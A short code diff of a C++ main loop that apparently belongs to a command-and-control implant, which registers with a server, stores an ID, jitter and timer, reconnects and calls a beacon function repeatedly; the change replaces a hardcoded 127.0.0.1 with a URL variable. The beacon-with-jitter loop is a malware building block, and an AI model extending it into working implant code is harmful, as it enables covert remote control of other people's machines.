@@ -15,26 +15,23 @@
 #endif
 
 int main() {
-    std::string ID = "";
-    int Jitter = -1;
-    int Timer = -1;
     while (true) {
         try {
-            if (ID != "" && Jitter != -1 && Timer != -1) {
-                auto result = httpReconnect("127.0.0.1", ID, Jitter, Timer);
+            if (ID != "" && JITTER != -1 && TIMER != -1) {
+                auto result = httpReconnect(URL, ID, JITTER, TIMER);
                 if (std::get<0>(result) == -1) {
                     continue;
                 }
             } else {
-                auto result = httpConnection("127.0.0.1");
+                auto result = httpConnection(URL);
                 if (std::get<0>(result) == -1) {
                     continue;
                 }
-                Timer = std::get<0>(result);
+                TIMER = std::get<0>(result);
                 ID = std::get<1>(result);
-                Jitter = std::get<2>(result);
+                JITTER = std::get<2>(result);
             }
-            int err = beacon(URL, ID, Jitter, Timer);
+            int err = beacon();
             if (err == -1) {
                 continue;
             }
